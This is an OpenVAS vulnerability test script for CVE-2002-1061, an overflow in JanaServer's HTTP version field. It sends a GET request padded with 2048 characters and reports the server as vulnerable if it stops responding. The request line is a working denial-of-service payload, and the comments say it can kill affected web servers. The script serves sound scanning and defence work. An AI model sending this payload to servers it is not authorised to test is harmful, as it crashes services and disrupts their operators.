# OpenVAS Vulnerability Test
# $Id: www_too_long_version.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: HTTP version number overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the web server by
sending an invalid GET request with a too long HTTP version field

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# References:
# Date:  Fri, 26 Jul 2002 12:12:45 +0400
# From: "3APA3A" <3APA3A@SECURITY.NNOV.RU>
# To: bugtraq@securityfocus.com
# Subject: SECURITY.NNOV: multiple vulnerabilities in JanaServer
#
# Affected:
# JanaServer 2.2.1 and prior
# JanaServer 1.46 and prior

if(description)
{
 script_id(11061);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(5319, 5320, 5322, 5324);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2002-1061");
 name = "HTTP version number overflow";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before OpenVAS 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("find_service.nasl", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

########


include("http_func.inc");

r = string("GET / HTTP/", crap(2048), ".O\r\n\r\n");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);



if(http_is_dead(port: port)) { security_message(port); }
